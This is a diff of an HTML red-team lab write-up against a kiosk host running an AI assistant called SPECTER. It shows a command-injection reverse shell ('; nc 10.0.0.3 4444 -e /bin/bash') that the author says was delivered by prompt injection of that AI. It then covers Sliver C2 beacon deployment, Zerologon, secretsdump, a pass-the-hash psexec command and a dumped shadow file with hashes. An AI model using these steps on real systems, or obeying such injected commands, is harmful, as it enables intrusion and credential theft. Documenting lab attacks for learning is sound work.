@@ -186,104 +186,85 @@ Service detection performed. Please report any incorrect results at https://nmap
   TramDiagnostics 192.168.20.50<span class="p">;</span> nc 10.0.0.3 4444 <span class="nt">-e</span> /bin/bash
 </code></pre></div>    </div>
   </li>
-  <li>
-    <p>On our attacking machine we have a netcat listener listening for connections:</p>
-
+  <li>On our attacking machine we have a netcat listener listening for connections:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  nc <span class="nt">-lvnp</span> 4444
 </code></pre></div>    </div>
   </li>
   <li>Once the connection is established we enter:
     <ul>
-      <li>This sets our terminal type to emulate a real terminal</li>
+      <li>This sets our terminal type to emulate a real terminal
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div>        </div>
+      </li>
+      <li>This allows us to spawn a more interactive shell, by spawning a bash. Python must be installed on the system for this to work.
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div>        </div>
+      </li>
     </ul>
-
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
-</code></pre></div>    </div>
-
-    <ul>
-      <li>This allows us to spawn a more interactive shell, by spawning a bash. Python must be installed on the system for this to work.</li>
-    </ul>
-
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
-</code></pre></div>    </div>
   </li>
   <li>Rather than one Red Team Operator enumerating the Linux machine we resorted to a C2 server.</li>
   <li>C2 servers allow multiple Red Team Operators to connect to a host through beacons.</li>
 </ul>
 
-<p><img src="/assets/img/sliver.png" alt="SLIVER" /></p>
+<p><img src="/assets/img/ITSecurity/sliver.png" alt="SLIVER" /></p>
 
 <ul>
   <li>For documentation:
     <ul>
-      <li>https://sliver.sh/</li>
-      <li>https://bishopfox.com/tools/sliver</li>
-      <li>https://dominicbreuker.com/post/learning_sliver_c2_01_installation/</li>
+      <li><a href="https://sliver.sh/">https://sliver.sh/</a></li>
+      <li><a href="https://bishopfox.com/tools/sliver">https://bishopfox.com/tools/sliver</a></li>
+      <li><a href="https://dominicbreuker.com/post/">learning_sliver_c2_01_installation/</a></li>
     </ul>
   </li>
-  <li>Inspiration from nosecurity:
+  <li>Inspiration from NoSecurity:
     <ul>
-      <li>https://nosecurity.blog/osep</li>
+      <li><a href="https://nosecurity.blog/osep">NoSecurity</a></li>
     </ul>
   </li>
-  <li>
-    <p>We first download the sliver program:</p>
-
+  <li>We first download the sliver program:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">sudo </span>apt <span class="nb">install </span>sliver
 </code></pre></div>    </div>
   </li>
   <li>Then we start the sliver server
     <ul>
-      <li>It is recommended to run C2 servers using a tmux session in case terminal closes.</li>
+      <li>It is recommended to run C2 servers using a tmux session in case terminal closes.
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sliver-server
+</code></pre></div>        </div>
+      </li>
     </ul>
-
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sliver-server
-</code></pre></div>    </div>
   </li>
   <li>We can open a new terminal session (I recommend using tmux and creating a new window)
     <ul>
-      <li>Tmux:</li>
-    </ul>
-
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  tmux 
+      <li>Tmux:
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  tmux 
   CTRL+B+C
-</code></pre></div>    </div>
+</code></pre></div>        </div>
+      </li>
+    </ul>
   </li>
-  <li>
-    <p>Then we use the sliver-client:</p>
-
+  <li>Then we use the sliver-client:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sliver-client
 </code></pre></div>    </div>
   </li>
-  <li>
-    <p>Then we start multiplayer mode in the C2 server to allow multiple operators to connect:</p>
-
+  <li>Then we start multiplayer mode in the C2 server to allow multiple operators to connect:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">[</span>server] sliver <span class="o">&gt;</span> multiplayer
 </code></pre></div>    </div>
   </li>
-  <li>
-    <p>I don’t think it matters where you create the Operator profiles but I did it in the sliver-server. We need to create a profile for each RTO:</p>
-
+  <li>I don’t think it matters where you create the Operator profiles but I did it in the sliver-server. We need to create a profile for each RTO:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">[</span>server] sliver <span class="o">&gt;</span> new-operator <span class="nt">--name</span> soulis <span class="nt">--lhost</span> 127.0.0.1
 </code></pre></div>    </div>
   </li>
-  <li>
-    <p>For other operators enter your machines IP where the server is being hosted on:</p>
-
+  <li>For other operators enter your machines IP where the server is being hosted on:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">[</span>server] sliver <span class="o">&gt;</span> new-operator <span class="nt">--name</span> rto2 <span class="nt">--lhost</span> 10.0.0.3
 </code></pre></div>    </div>
   </li>
-  <li>
-    <p>Once the configuration file is generated the RTO’s need to import it to their sliver-client running on their machine:</p>
-
+  <li>Once the configuration file is generated the RTO’s need to import it to their sliver-client running on their machine:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nv">$ </span>./sliver-client import ./soulis_example.com.cfg
   <span class="nv">$ </span>./sliver-client import ./rto1_example.com.cfg
 </code></pre></div>    </div>
   </li>
   <li>Now we should see a message on the sliver server notifying us that an operator has connected.</li>
-  <li>
-    <p>The heart of C2 servers generating a beacon:</p>
-
+  <li>The heart of C2 servers generating a beacon:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  generate <span class="nt">--os</span> linux <span class="nt">--arch</span> amd64 <span class="nt">--format</span> elf <span class="nt">--http</span> http://10.0.0.3:80
 </code></pre></div>    </div>
 
@@ -297,48 +278,35 @@ Service detection performed. Please report any incorrect results at https://nmap
   <li>Currently we have access to the KIOSK using a netcat session which is considered to be an unstable connection.</li>
   <li>By using beacons we will have a more reliable connection and do not have to keep performing prompt injection to the SPECTER AI to get a reverse shell. We can simply connect to the beacon instead.</li>
   <li>Dont be like me. I recommend you read the documentation I forgot to setup a listener on the sliver-client so I was just sitting there for a few minutes waiting for the beacon to connect back to me.</li>
-  <li>
-    <p>Setting up a listener. Since our beacond uses an http connection we setup an http listener:</p>
-
+  <li>Setting up a listener. Since our beacond uses an http connection we setup an http listener:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">[</span>client] sliver <span class="o">&gt;</span> http
 </code></pre></div>    </div>
 
     <ul>
-      <li>If you are confused on what the commands do enter help</li>
-    </ul>
-
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">[</span>client] sliver <span class="o">&gt;</span> <span class="nb">help</span>
-</code></pre></div>    </div>
-
-    <ul>
-      <li>You can also enter:</li>
-    </ul>
-
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">[</span>client] sliver <span class="o">&gt;</span> <span class="nb">help </span>http
-</code></pre></div>    </div>
-
-    <ul>
+      <li>If you are confused on what the commands do enter help
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">[</span>client] sliver <span class="o">&gt;</span> <span class="nb">help</span>
+</code></pre></div>        </div>
+      </li>
+      <li>You can also enter:
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">[</span>client] sliver <span class="o">&gt;</span> <span class="nb">help </span>http
+</code></pre></div>        </div>
+      </li>
       <li>To get more info on the specific command</li>
     </ul>
   </li>
   <li>Ok so our beacon is generated, our http listener is running, we have an initial foothold on the KIOSK now we need to upload our beacon to the Linux machine:
     <ul>
-      <li>I just setup a python server in the same directory where the beacons are located:</li>
+      <li>I just setup a python server in the same directory where the beacons are located:
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  python3 <span class="nt">-m</span> http.server 8000
+</code></pre></div>        </div>
+      </li>
+      <li>On the KIOSK machine we enter:
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  wget http://MACHINE_IP:PORT/NAME_OF_BEACON
+</code></pre></div>        </div>
+      </li>
     </ul>
-
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  python3 <span class="nt">-m</span> http.server 8000
-</code></pre></div>    </div>
-
-    <ul>
-      <li>On the KIOSK machine we enter:</li>
-    </ul>
-
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  wget http://MACHINE_IP:PORT/NAME_OF_BEACON
-</code></pre></div>    </div>
   </li>
-  <li>
-    <p>From there we execute the beacon:</p>
-
+  <li>From there we execute the beacon:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  specter@VISITOR-KIOSK:~/chainlit<span class="nv">$ </span>./NAME_OF_BEACON &amp;
 </code></pre></div>    </div>
 
@@ -347,35 +315,25 @@ Service detection performed. Please report any incorrect results at https://nmap
       <li>On the server you will see a new session created</li>
     </ul>
   </li>
-  <li>
-    <p>To connect to the session we enter:</p>
-
+  <li>To connect to the session we enter:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sessions 
 </code></pre></div>    </div>
 
     <ul>
-      <li>
-        <p>We will be able to view the current session running on the server:</p>
-
-        <p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/917dae18-690d-4b9f-9c2d-d0631eda5688/7e1ac740-fa51-4dac-87c5-9164b6c9da94/vmware_TtZeTp4y5m.png" alt="vmware_TtZeTp4y5m.png" /></p>
-      </li>
+      <li>We will be able to view the current session running on the server:
+  <img src="/assets/img/ITSecurity/beacons.png" alt="beacons" /></li>
     </ul>
   </li>
-  <li>
-    <p>To use a session enter the use command and the ID of the session:</p>
-
+  <li>To use a session enter the use command and the ID of the session:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  use SESSION_ID
 </code></pre></div>    </div>
   </li>
   <li>Then we will have a connection to the KIOSK machine:
     <ul>
-      <li>To spawn an interactive mode we use:</li>
-    </ul>
-
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  shell
-</code></pre></div>    </div>
-
-    <ul>
+      <li>To spawn an interactive mode we use:
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  shell
+</code></pre></div>        </div>
+      </li>
       <li>Note this is bad OPSEC meaning detection mechanisms will catch or log this activity, not recommended in real world scenarios, but I think its ok for now.</li>
     </ul>
   </li>
@@ -384,32 +342,22 @@ Service detection performed. Please report any incorrect results at https://nmap
       <li>A side mission of mine is to try to get root access on the KIOSK machine.</li>
     </ul>
   </li>
-  <li>
-    <p>Using the specter user I executed the following:</p>
-
+  <li>Using the specter user I executed the following:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  specter@VISITOR-KIOSK:~/impacket-master/example<span class="nv">$ </span>python3 zerologon_tester.py DC 192.168.20.50
 </code></pre></div>    </div>
 
     <ul>
       <li>This checks if the domain controller is vulnerable to zerologon</li>
       <li>This vulnerability makes it possible for a hacker to impersonate any computer, including the root domain controller.</li>
-      <li>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1424</li>
-      <li>https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/</li>
+      <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1424">CVE-2020-1424</a></li>
+      <li><a href="https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/">ZeroLogon</a></li>
     </ul>
   </li>
   <li>We execute:
-    <ul>
-      <li></li>
-    </ul>
-
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  python3 secretsdump.py <span class="nt">-no-pass</span> <span class="nt">-just-dc</span> DC<span class="se">\1</span>92.168.20.50 <span class="o">&gt;</span> rndDCHash
 </code></pre></div>    </div>
   </li>
   <li>Then we execute:
-    <ul>
-      <li></li>
-    </ul>
-
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  python3 psexec.py <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:5896fcafdb0d18ea8f84db22fa8347e9 Administrator@192.168.20.50
 </code></pre></div>    </div>
   </li>
@@ -426,13 +374,10 @@ User specter may run the following commands on VISITOR-KIOSK:
 
 <span class="o">[</span>+] Possible <span class="nb">sudo </span>pwnage!
 /usr/local/bin/specter-analytics.sh
-
 </code></pre></div></div>
 
 <ul>
-  <li>
-    <p>unshadow shadow file:</p>
-
+  <li>unshadow shadow file:
     <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">cat </span>shadow
   root:<span class="nv">$y$j9T$U0kWOooaSRxbHUG22uwya</span>.<span class="nv">$/</span>jCItZX2rANan07x6tfe4dH./Iydnq9sQb2q764Hbk4:19813:0:99999:7:::
   daemon:<span class="k">*</span>:19456:0:99999:7:::
@@ -472,7 +417,6 @@ User specter may run the following commands on VISITOR-KIOSK:
   specter:<span class="nv">$y$j9T$p3jivMvEmec5C7ibQ4vPu</span>/<span class="nv">$vhrhRsMPmgkqC7agQ</span>.8NKQfze0UbTH1S1i/jCIH3rR3:19813:0:99999:7:::
   ollama:!:19813::::::
   ftp:<span class="k">*</span>:19813:0:99999:7:::
-    
 </code></pre></div>    </div>
   </li>
 </ul>
